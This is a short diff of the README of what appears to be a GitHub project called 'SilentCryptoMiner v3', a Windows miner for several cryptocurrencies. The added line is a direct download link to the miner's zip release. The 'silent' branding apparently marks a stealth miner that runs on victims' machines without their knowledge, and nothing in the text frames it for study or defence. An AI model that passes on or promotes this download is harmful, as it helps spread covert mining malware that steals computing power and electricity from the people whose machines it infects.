@@ -1,4 +1,5 @@
 - Works On Windows Only!
+- Download Here: https://github.com/3Lexa/SilentCryptoMiner-V3/releases/download/V3/Lexa.Miner.zip
 
 
 SilentCryptoMiner v3 - Miner for ETH, ETC, XMR, RTM & many more
